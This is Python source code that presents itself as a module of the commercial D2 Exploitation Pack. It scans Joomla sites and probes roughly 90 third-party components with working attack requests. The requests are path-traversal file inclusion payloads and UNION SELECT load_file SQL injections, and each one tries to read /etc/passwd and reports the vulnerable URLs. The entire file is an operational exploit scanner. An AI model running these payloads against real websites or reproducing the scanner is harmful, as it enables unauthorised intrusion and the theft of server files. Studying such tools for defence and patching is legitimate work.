#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import sys, os, re, string
try:
  import pycurl
  import StringIO
except ImportError, e:
  print ' %s' % e

def fingerprint(host, port, base, webhost):
  dirs = ['', 'cms', 'joomla']
  phps = ['', 'administrator']
  regs = ['content="joomla', 'content="Joomla', 'href="/administrator/templates', 'src="/media/system/js', 'src="/templates/system']
  nfo = []
  content = StringIO.StringIO()
  c = None
  try:
    c = pycurl.Curl()
    c.setopt(c.TIMEOUT, 15)
    c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
    c.setopt(c.HTTPHEADER, ['Host: %s' % webhost])
    for d in dirs:
      for s in phps:
        try:
          c.setopt(pycurl.URL, 'http://%s:%d/%s/index.php' % (host, port, os.path.join(base, d, s)))
          c.setopt(c.WRITEFUNCTION, content.write)
          c.perform()
          data = content.getvalue()
          ver = re.findall('<meta name=".?enerator" content=".*?" />', data, re.DOTALL)
          if ver:
            v = string.lower(ver[0])
            if v.find('joomla') > 0:
              c.close()
              nfo.append('[*] %s' % ver[0])
              return nfo
          for reg in regs:
            ver = re.findall(reg, data, re.DOTALL)
            if ver:
              c.close()
              nfo.append('[*] Joomla found !')
              return nfo
        except Exception, e:
          nfo.append('[-] %s' % e)
          return nfo
  except Exception, e:
    nfo.append('[-] %s' % e)
    return nfo
  c.close()

def checklfi(host, port, base, webhost, component):
  c = None
  nfo = list()
  content = StringIO.StringIO()
  try:
    c = pycurl.Curl()
    c.setopt(c.TIMEOUT, 15)
    c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
    c.setopt(c.HTTPHEADER, ['Host: %s' % webhost])
    request = '%s/%s../../../../../../../../../../../../../../../../etc/passwd%%00' % (base, component)
    c.setopt(pycurl.URL, 'http://%s:%d/%s' % (host, port, request))
    c.setopt(c.WRITEFUNCTION, content.write)
    c.perform()
    status = c.getinfo(pycurl.HTTP_CODE)
    if status == 200:
      data = content.getvalue()
      if re.search('root:', data):
        nfo.append("[+] http://%s/%s\n" % (webhost, request))
  except Exception, e:
    nfo.append('[-] %s' % e)
  return nfo

def checksqli(host, port, base, webhost, component):
  c = None
  nfo = list()
  content = StringIO.StringIO()
  try:
    c = pycurl.Curl()
    c.setopt(c.TIMEOUT, 15)
    c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
    c.setopt(c.HTTPHEADER, ['Host: %s' % webhost])
    request = "%s/%s-1+UNION+SELECT+load_file('/etc/passwd')" % (base, component)
    c.setopt(pycurl.URL, 'http://%s:%d/%s' % (host, port, request))
    c.setopt(c.WRITEFUNCTION, content.write)
    c.perform()
    status = c.getinfo(pycurl.HTTP_CODE)
    if status == 200:
      data = content.getvalue()
      if re.search('root:', data):
        nfo.append("[+] http://%s/%s\n" % (webhost, request))
  except Exception, e:
    nfo.append('[-] %s' % e)
  return nfo

_components_joomla = {
    'index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=': checksqli,
    'index.php?option=com_jedirectory&view=item&catid=': checksqli,
    'index.php?option=com_jejob&view=item_detail&itemid=': checksqli,
    'index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id=': checksqli,
    'index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=': checksqli,
    'index.php?option=com_jgen&task=view&id=': checksqli,
    'index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id=': checksqli,
    'index.php?option=com_fabrik&view=table&tableid=': checksqli,
    'index.php?option=com_zina&view=zina&Itemid=': checksqli,
    'index.php?option=com_ongallery&task=ft&id=': checksqli,
    'index.php?option=com_equipment&view=details&id=': checksqli,
    'index.php?option=com_amblog&view=amblog&catid=': checksqli,
    'index.php?option=com_yellowpages&cat=': checksqli,
    'index.php?option=com_neorecruit&task=offer_view&id=': checksqli,
    'index.php?option=com_beamospetition&startpage=3&pet=': checksqli,
    'index.php?option=com_simpleshop&Itemid=23&task=viewprod&id=': checksqli,
    'index.php?option=com_ttvideo&task=video&cid=': checksqli,
    'index.php?option=com_youtube&id_cate=': checksqli,
    'index.php?option=com_oziogallery&Itemid=': checksqli,
    'index.php?option=com_iproperty&view=agentproperties&id=': checksqli,
    'index.php?option=com_huruhelpdesk&view=detail&cid[0]=': checksqli,
    'index.php?option=com_spa&view=spa_read_more&pid=': checksqli,
    'index.php?option=com_staticxt&staticfile=test.php&id=': checksqli,
    'index.php?option=com_spa&view=spa_product&cid=': checksqli,
    'index.php?option=com_qcontacts&Itemid=': checksqli,
    'index.php?option=com_redshop&view=product&pid=': checksqli,
    'index.php?option=com_jpodium&view=races&Itemid=': checksqli,
    'index.php?option=com_phocagallery&view=categories&Itemid=': checksqli,
    'index.php?option=com_gamesbox&view=consoles&layout=console&id=': checksqli,
    'index.php?option=com_ybggal&Itemid=1&catid=': checksqli,
    'index.php?option=com_jce&Itemid=': checksqli,
    'index.php?option=com_maianmedia&view=music&cat=': checksqli,
    'index.php?option=com_clan_members&id=': checksqli,
    'index.php?option=com_people&controller=people&task=details&id=': checksqli,
    'index.php?option=com_jeauto&catid=1&item=1&Itemid=3&view=item&char=': checksqli,
    'index.php?option=com_annuaire&view=annuaire&type=cat&id=': checksqli,
    'index.php?option=com_jeajaxeventcalendar&view=alleventlist_more&event_id=': checksqli,
    'index.php?option=com_storedirectory&task=view&id=': checksqli,
    'index.php?option=com_competitions&task=view&id=': checksqli,
    'index.php?option=com_sponsorwall&controller=sponsorwall&catid=': checksqli,
    'index.php?option=com_flipwall&controller=flipwall&catid=': checksqli,
    'index.php?option=com_projects&view=project&id=': checksqli,
    'index.php?option=com_jeguestbook&view=item_detail&d_itemid=': checksqli,
    'index.php?option=com_timetrack&view=timetrack&ct_id=': checksqli,
    'index.php?option=com_restaurantguide&controller=restaurantitem&task=edit&cid=': checksqli,
    'index.php?option=com_nkc&view=insc&lang=en&gp=': checksqli,
    'index.php?option=com_jefaqpro&view=category&layout=categorylist&task=lists&catid=': checksqli,
    'index.php?option=com_golfcourseguide&view=golfcourses&cid=1&id=': checksqli,
    'index.php?option=com_joomdle&view=detail&cat_id=1&course_id=': checksqli,
    'index.php?option=com_xmap&sitemap=2&Itemid=': checksqli,
    'index.php?option=com_jimtawl&Itemid=12&task=': checklfi,
    'index.php?option=com_jradio&controller=': checklfi,
    'index.php?option=com_frontenduseraccess&controller=': checklfi,
    'index.php?option=com_jotloader&section=': checklfi,
    'index.php?option=com_jeguestbook&view=': checklfi,
    'index.php?option=com_picsell&controller=prevsell&task=dwnfree&flink=': checklfi,
    'index.php?option=com_sef&Itemid=&mos.Config.absolute.path=': checklfi,
    'index.php?option=com_realtyna&controller=': checklfi,
    'index.php?option=com_myblog&controller=': checklfi,
    'index.php?option=com_picasa2gallery&controller=': checklfi,
    'index.php?option=com_noticeboard&controller=': checklfi,
    'index.php?option=com_foobla_suggestions&controller=': checklfi,
    'index.php?option=com_jphone&controller=': checklfi,
    'index.php?option=com_docman&task=cat_view&gid=3&Itemid=7&limit=15&limitstart=-11': checksqli,
    'index.php?option=com_aist&view=vacancylist&content_id=': checksqli,
    'index.php?option=com_joomradio&page=show_video&id=': checksqli,
    'index.php?option=com_img&controller=': checklfi,
    'faq-book?view=category&id=': checksqli,
    '?act=story_lists&task=item&link_id=': checksqli,
    'print.php?task=person&amp;id=': checksqli,
    'index.php?option=com_calcbuilder&controller=calcbuilder&format=raw&id=': checksqli,
    'index.php?option=com_jr_tfb&controller=': checklfi,
    'index.php?option=com_rsappt_pro2&view=': checklfi,
    'index.php?option=com_jesubmit&view=': checklfi,
    'index.php?option=com_obsuggest&controller=': checklfi,
    'index.php?option=com_joomtouch&controller=': checklfi,
    'index.php?search=NoGe&option=com_esearch&searchId=': checksqli,
    'index.php?option=com_joomlapicasa2&controller=': checklfi,
    'index.php?option=com_datafeeds&controller=': checklfi,
    'index.php?option=com_timereturns&view=timereturns&id=': checksqli,
    'index.php?option=com_sgicatalog&task=view&lang=en&id=': checksqli,
    'index.php?option=com_yjcontactus&view=': checklfi,
    'index.php?option=com_listing&task=browse&category_id=': checksqli,
    'index.php?option=com_vikrealestate&act=results&contract=': checksqli,
    'index.php?option=com_alameda&controller=comments&task=edit&storeid=1': checksqli,
    'index.php?option=com_hmcommunity&view=fnd_home&id=': checksqli,
}

def main(host, port, base, webhost):
  nfo = list()
  for component, func in _components_joomla.iteritems():
    datas = func(host, port, base, webhost, component)
    if datas: 
      for data in datas:
        nfo.append(data)
  return nfo

